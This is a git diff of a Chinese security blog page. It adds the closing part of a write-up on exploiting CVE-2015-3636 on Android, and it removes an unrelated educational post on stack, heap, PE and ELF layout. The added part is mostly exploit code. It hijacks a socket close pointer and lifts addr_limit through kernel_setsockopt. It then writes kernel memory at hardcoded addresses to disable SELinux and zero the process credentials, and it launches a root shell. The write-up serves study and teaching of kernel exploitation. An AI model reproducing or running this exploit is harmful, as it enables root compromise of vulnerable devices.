copy_to_user(userstamp, &amp;ts, <span class="keyword">sizeof</span>(ts)) ? -EFAULT : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_get_timestampns);</span><br><span class="line"><span class="comment">//这个函数会返回sk-&gt;sk_stamp，在我们的环境中它在sock对象中的偏移正是0x1D8</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/14/CVE-2015-3636/12.png" alt="12"></p>
+<p>找到exp_sock之后因为它已经完全在我们的控制之中了，所以函数指针也是可控的，对其调用close函数就可以控制PC了。</p>
+<p>可以看到close是在inet_close中调用的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (sk) &#123;</span><br><span class="line">        <span class="keyword">long</span> timeout;</span><br><span class="line"> </span><br><span class="line">        sock_rps_reset_flow(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Applications forget to leave groups before exiting */</span></span><br><span class="line">        ip_mc_drop_socket(sk);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* If linger is set, we don't return until the close</span></span><br><span class="line"><span class="comment">         * is complete.  Otherwise we return immediately. The</span></span><br><span class="line"><span class="comment">         * actually closing is done the same either way.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * If the close is due to the process exiting, we never</span></span><br><span class="line"><span class="comment">         * linger..</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        timeout = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (sock_flag(sk, SOCK_LINGER) &amp;&amp;</span><br><span class="line">            !(current-&gt;flags &amp; PF_EXITING))</span><br><span class="line">            timeout = sk-&gt;sk_lingertime;</span><br><span class="line">        sock-&gt;sk = <span class="literal">NULL</span>;</span><br><span class="line">        sk-&gt;sk_prot-&gt;close(sk, timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_release);</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/14/CVE-2015-3636/13.png" alt="13"></p>
+<p>找一下发现偏移是0x28，所以我们将<code>payload+0x28</code>设置为payload的地址，将payload开头设置为<code>0xFFFFFFC00035D788</code>让它跳到<code>kernel_setsockopt</code></p>
+<p><img src="/2018/08/14/CVE-2015-3636/14.png" alt="14"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x28</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)payload;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload)         = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D788</span>;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)payload + <span class="number">0x68</span>)  = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0xFFFFFFC00035D7C0</span>;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
+<p>addr_limit规定了特定线程的用户空间地址最大值，超过这个值的地址用户空间代码不能访问。</p>
+<p>所以把addr_limit改成0xffffffff就可以对内核为所欲为了</p>
+<p>现在我们已经来到了kernel_setsockopt，应该怎么改addr_limit呢？</p>
+<p>当内核需要去使用系统调用的时候就要去掉地址空间的限制，一般的流程是：</p>
+<ul>
+<li>(1)oldfs=get_fs()</li>
+<li>(2)set_fs(KERNEL_DS)</li>
+<li>(3)set_fs(oldfs)</li>
+</ul>
+<p>如果能绕过set_fs(oldfs)的执行，内核空间将一直对用户态打开，这样就绕过了限制。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">char</span> *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mm_segment_t</span> oldfs = get_fs();</span><br><span class="line">    <span class="keyword">char</span> __user *uoptval;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"> </span><br><span class="line">    uoptval = (<span class="keyword">char</span> __user __force *) optval;</span><br><span class="line"> </span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line">    <span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">        err = sock_setsockopt(sock, level, optname, uoptval, optlen);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = sock-&gt;ops-&gt;setsockopt(sock, level, optname, uoptval,</span><br><span class="line">                        optlen);</span><br><span class="line">    set_fs(oldfs);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kernel_setsockopt);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fs(x)  (current_thread_info()-&gt;addr_limit = (x))</span></span><br></pre></td></tr></table></figure>
+<p>注意这里因为我们控制了X0所以<code>BLR  X5</code>跳过了<code>STR  X20, [X19,#8]</code>。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/15.png" alt="15"></p>
+<p><img src="/2018/08/14/CVE-2015-3636/16.png" alt="16"></p>
+<p>截一张mosec2016上360冰刃实验室讲的<a href="https://github.com/jianqiangzhao/mosec2016/blob/master/Android%20Root%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%EF%BC%9A%E7%BB%95%E8%BF%87PXN.ppt" target="_blank" rel="noopener">《Android Root利用技术漫谈：绕过PXN》</a>中的一张图帮助理解。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/17.png" alt="17"></p>
+<p>现在可以任意读写内核了,下一步是修改全局mmap_min_addr让我们能够在用户态mmap null地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwrite the global variable mmap_min_addr to 0, then we can mmap NULL in user-mode </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data8 = <span class="number">0</span>; </span><br><span class="line">kernel_write8((<span class="keyword">void</span> *)<span class="number">0xffffffc000652148</span>, &amp;data8);</span><br><span class="line">user_mm = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(MAP_FAILED == user_mm)</span><br><span class="line">&#123;</span><br><span class="line">   perror(<span class="string">"[*] mmap NULL fail"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个地址应该怎么找呢?</p>
+<p>注意到setup_arg_pages中有mmap_min_addr。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/18.png" alt="18"></p>
+<p><img src="/2018/08/14/CVE-2015-3636/19.png" alt="19"></p>
+<p><code>0xFFFFFFC00063EE9F+0x132A9=0xFFFFFFC000652148</code>就是这么来的。</p>
+<p>接下来关掉selinux，方法同上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   overwirte selinux_enforcing to disable selinux</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data4 = <span class="number">0</span>;</span><br><span class="line">kernel_write4((<span class="keyword">void</span> *)<span class="number">0xffffffc00065399c</span>, &amp;data4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] selinux disabled.\n"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/14/CVE-2015-3636/20.png" alt="20"></p>
+<p><img src="/2018/08/14/CVE-2015-3636/21.png" alt="21"></p>
+<p>在arm64系统上栈的最大深度为16K，所以<code>unsigned long thread_info_addr=sp&amp;0xFFFFFFFFFFFFC000</code></p>
+<p>task结构体的偏移是0x10，我们再次调用close，通过下面这段gadget把task结构体的指针leak到<code>0x0000000000000018</code>(X1是0)。</p>
+<p><img src="/2018/08/14/CVE-2015-3636/22.png" alt="22"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(unsigned long *)((char *)payload + 0x290) = 0;</span><br><span class="line">*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;</span><br><span class="line">*(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC0004AA518;</span><br><span class="line">close(exp_sock);</span><br></pre></td></tr></table></figure>
+<p>接下来改掉task_struct-&gt;cred，整个提权过程就完成了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      overwrite task_struct-&gt;cred to gain root privilege</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   task = <span class="literal">NULL</span>;</span><br><span class="line">   task = (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)user_mm + <span class="number">0x18</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] task:%p\n"</span>, task); </span><br><span class="line"> </span><br><span class="line">   cred = <span class="literal">NULL</span>;</span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x398</span>, &amp;cred);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] cred:%p\n"</span>, cred);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">4</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred +  <span class="number">8</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">12</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">16</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">20</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">24</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">28</span>,  &amp;data4);</span><br><span class="line">   kernel_write4((<span class="keyword">char</span> *)cred + <span class="number">32</span>,  &amp;data4);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      cleanup to avoid crash. overwirte task_struct-&gt;files-&gt;fdt-&gt;max_fds to 0</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)task + <span class="number">0x788</span>, &amp;files);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] files:%p\n"</span>, files);</span><br><span class="line"> </span><br><span class="line">   kernel_read8((<span class="keyword">char</span> *)files + <span class="number">8</span>, &amp;fdt);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] fdt:%p\n"</span>, fdt);</span><br><span class="line"> </span><br><span class="line">   data4 = <span class="number">0</span>;</span><br><span class="line">   kernel_write4(fdt, &amp;data4);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[*] congrats, enjoy your root shell.\n"</span>);</span><br><span class="line">      system(<span class="string">"/system/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Oops, you'd better have a cup of tea and try again:(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>文章中另外涉及到的参考知识：</p>
+<p><a href="https://purzle.wordpress.com/2017/07/07/android-interals-part-4/" target="_blank" rel="noopener">Android Interals-Part4</a></p>
+<p><a href="https://www.kernel.org/doc/htmldocs/networking/API-struct-sock.html" target="_blank" rel="noopener">API-struct-sock.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/14/CVE-2015-3636/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Android程序的生成步骤" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1568,170 +1794,6 @@
 
 
   
-    <article id="post-栈，堆，PE，ELF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/08/栈，堆，PE，ELF/">栈，堆，PE，ELF</a>
-    </h1>
-  
-
-        
-        <a href="/2018/07/08/栈，堆，PE，ELF/" class="archive-article-date">
-  	<time datetime="2018-07-08T10:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="1-地址转换"><a href="#1-地址转换" class="headerlink" title="1. 地址转换"></a>1. 地址转换</h1><p><img src="/2018/07/08/栈，堆，PE，ELF/1.png" alt="1"></p>
-<p>线性地址分成2/3个部分，首先用PDBR（Page Directory Base Register,页面目录基址寄存器）或CR3（Control Register 3，控制寄存器3）查找Page Directory（页面目录）。在这之后，线性地址里的第22~31位作为Page Directory里的偏移量，标识使用的Page Table（页面表）一旦找到Page Table，将用第12~21位查找PTE（Page Table Entry，页面表项）（标识使用的内存页），最后，线性地址的第0~11位用作在页面里定位请求的数据的偏移量。</p>
-<h1 id="2-栈"><a href="#2-栈" class="headerlink" title="2 .栈"></a>2 .栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> variable_zero;</span><br><span class="line"><span class="comment">//zero，全局变量，未被初始化，编译器为其二进制文件里分配空间并填充零，位于BSS段。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> variable_one=<span class="number">0x1234</span>;</span><br><span class="line"><span class="comment">//one，全局变量，已被初始化，编译器在二进制文件里为其分配空间，把数据保存在数据段（.data）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//main 函数，代码段（.text）</span></span><br><span class="line">    <span class="keyword">void</span> *variable_two=<span class="built_in">malloc</span>(<span class="number">0x1234</span>);</span><br><span class="line">    <span class="comment">//指针本事是函数的一部分，动态分配的，存在于栈段之中，与函数的生命周期相同。</span></span><br><span class="line">    <span class="comment">// malloc返回的指针存在于堆中，动态分配，具有全局作用域及“use-until-free”生命周期。</span></span><br><span class="line">    [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>栈：所有的自动或局部变量都保存在它上面，<strong>当一个函数被调用时，任何它声明的不是静态或类似的局部变量都会在栈上分配相应的空间。</strong></p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/2.png" alt="n2"></p>
-<p>栈指针是esp寄存器，通常指向栈段的顶端，SS：ESP指向栈段的顶端。</p>
-<p>栈帧指的是与当前正在指执行的函数有关的当前视图，当处理器进入新过程时，会执行预处理例程。</p>
-<p>（procedure prologue）：首先把调用帧里下一条指令的地址压入栈，接着把当前栈的基址（EBP）保存在栈上，然后把ESP寄存器复制到EBP寄存器里，最后把ESP寄存器里的值减去一部分，从而为函数里的变量的分配空间。函数调用时，函数的参数逆序入栈。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x1234</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/3.png" alt="3"></p>
-<p>扫尾例程：（procedure epilogue）恢复预处理所做的改变，包括调大栈指针的值（取消分配的局部变量），调用leave和ret指令（移去保存的帧指针和返回地址，并把执行流返回给调用函数）。</p>
-<ul>
-<li>在IA-32平台上，栈向着较小的地址增长。</li>
-<li>栈以LIFO的顺序移去或增加数据。</li>
-<li>局部变量及只存在与函数生命周期的变量随着栈的取消而结束。</li>
-<li>每个函数都会有包含局部变量的栈帧（除非编译器故意忽略）。</li>
-<li>在每个函数的栈帧之前有保存的帧指针，返回地址和例程的参数。</li>
-<li>栈帧在预处理期间构造，在扫尾例程执行期间取消。</li>
-</ul>
-<h1 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h1><p>堆只是内存中的一个区段（主要供那些动态分配的变量使用，这些变量需存在与当前栈帧之外）。</p>
-<p>大多数对象和应用程序使用的大量数据都会保存在堆上，堆通常是随机映射的，或是数据段的动态扩展。</p>
-<p>在初始化时，堆向操作系统请求尽可能大的内存区段，然后按应用程序的需求分给小的内存块。这些块包含内联的元数据，指示块大小及其他元素，例如前一块内存的大小。</p>
-<p>通过指向给定块的指针，再加上它（给定块）的大小就可以找到下一个块，或者通过把块开头地址减去前一个块的大小来发现前一个块。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/4.png" alt="4"></p>
-<p>已分配的块是通过大小来遍历（前一个快的大小，块大小，以及指示各种状态条件的元数据）</p>
-<p>空闲的内存块直接通过链表遍历（指向链表里下一个空闲的内存块，指向链表里前一个内存块）</p>
-<h1 id="4-PE-COFF"><a href="#4-PE-COFF" class="headerlink" title="4.PE-COFF"></a>4.PE-COFF</h1><p>Protable Executable and Common Object File Format：可移植可执行和通用对象文件格式。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/5.png" alt="5"></p>
-<p>DOS Stub：保存向后兼容。指向PE头部的偏移量。</p>
-<p>从文件头开始向后偏移0x3c处就是这个偏移量，指向从文件开头偏移多少是PE头部。</p>
-<p>PE头：以另外的字段标识PE文件的开始，通常是PE\0\0。在此之后是COFF文件头，该格式第一个字段是机器类型，2个字节长。<img src="/2018/07/08/栈，堆，PE，ELF/6.png" alt="6"></p>
-<p>可选文件头部布局：<img src="/2018/07/08/栈，堆，PE，ELF/7.png" alt="7"></p>
-<p>可选头部中COFF标准字段，Windows特定字段。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/8.png" alt="8"></p>
-<p>DLLCharacteristics：DLL特征字段，只适用于DLL，指定与DLL有关的特性。有意义的字段是0x0040，表明基地可以动态分配并允许ASLR（Address Space Layout Randomization，地址空间布局随机化），0x0080表明已经做过代码完整性检查，0x0100表明这个映像兼容NX（no-execute），最后0x0040，表明这个文件不使用SEH（Structured Exception Handling，结构化异常处理），从而预防SEH处理程序指向这个DLL，最后一个元素指定了可选头部中下一个子区段包含的元素数量。</p>
-<p>数据目录：</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/9.png" alt="9"></p>
-<p>输出表：指定了文件输出的函数（.edata区段）</p>
-<table>
-<thead>
-<tr>
-<th>名字</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>输出目录表</td>
-<td>描述了全部的输出信息。包含了在映像中用于决定输入到输出函数的地址信息。</td>
-</tr>
-<tr>
-<td>输出地址表</td>
-<td>包含了输出入口点的地址，相关数据和绝对地址。</td>
-</tr>
-<tr>
-<td>名字指针表</td>
-<td>输出名表中对应的RVA组成的数组。</td>
-</tr>
-<tr>
-<td>序数表</td>
-<td>输出地址表的16位序数数组。</td>
-</tr>
-<tr>
-<td>输出名表</td>
-<td>已输出函数/数据等的以NULL结束的变长字符串名。</td>
-</tr>
-</tbody>
-</table>
-<p>这些表都并不需要都存在，如果输出只通过序数完成，那么只需EDT（Export Directory Table输出目录表）及EAT（Export Address Table输出地址表）。</p>
-<p>输入表：（.idata区段） 输入符号时会用到三个主要结构：IDT（Import Directory Table，输入目录表），ILT（Import Lookup Table，输入查找表）和提示/名称表。</p>
-<p>加载配置结构：在WinXp及更新系统中，SafeSEH用这个区段注册有效的系统异常处理程序，从而避免攻击者覆盖SEH条目，引发系统异常并执行代码的问题。如果可选头部中的DLL特性字段里的IMAGE_DLLCHARACTERISTICS_NO_SHE字段没有置位，且异常处理程序在系统试图调用它时不在这个列表里，将停止处理。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/10.png" alt="10"></p>
-<p>SecurityCookie并不是真的是cookie，而是一个指向它的指针。这个cookie有多种使用方式，最知名的就是在微软编译器中指定/GS标志时，实现栈Cookie阻止基于栈的缓冲区溢出。SEHandler table是排过序的RVA表，它对应特定映像的有效SEH处理程序。SEHandlerCount是处理程序总数。</p>
-<h1 id="5-ELF"><a href="#5-ELF" class="headerlink" title="5.ELF"></a>5.ELF</h1><p>ELF（Executable and Linking Format）</p>
-<p>ELF头部，没有严格规定好的大小，每部分的大小都是根据处理器的原生大小而定的，多种处理器都这样用。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/11.png" alt="11"></p>
-<p>ELF文件里每一个区段都有一个区段头部描述它，尽管存在空区段和区段本事不重叠的现象，但区段描述是连续的。区段头部的元素如图：</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/12.png" alt="12"></p>
-<p>通用区段：名字前带”.“的区段是保留给系统使用的。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/13.png" alt="13"></p>
-<p>程序头部结构：程序头部表是程序头部结构的一个数组，这些结构定义了段（segment），以及怎样将二进制载入OS。表的大小及其包含的条目数量是在ELF头部中指定的。</p>
-<p><img src="/2018/07/08/栈，堆，PE，ELF/14.png" alt="14"></p>
-<p>p_type字段表示描述的是什么类型的段，并告诉系统怎样解释它的内容。</p>
-<p>p_offset成员指定从文件头开始的段偏移量。</p>
-<p>p_vaddr成员指定段的首选VA。</p>
-<p>p_filesz和p_memsz元素分别表示段在物理文件和内存中的大小。</p>
-<p>p_flags指定段的属性，PF_R,PF_W,PF_X分别对于读，写和执行。</p>
-<p><strong>可执行映像，共享库映像，采用ASLR的映像之间的差异：</strong></p>
-<p>可执行映像，为了加载可执行映像，在建立映像时必须包括每个段使用的地址，这个地址由段的p_vaddr成员指定。如果地址被改变的话，将导致对这个映像的绝对引用被中止。</p>
-<p>ASLR映像和共享库映像可以通过使用所谓的PIC（Position Independent Code，位置无关代码）绕过此限制。PIC隐含的意思就是不再采用绝对引用指向某段数据，而是改为相对引用。</p>
-<p>!!!之后，得好好研究研究一下，ELF文件格式了～</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/07/08/栈，堆，PE，ELF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
@@ -1851,11 +1913,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
              
               <li class="article-tag-list-item">
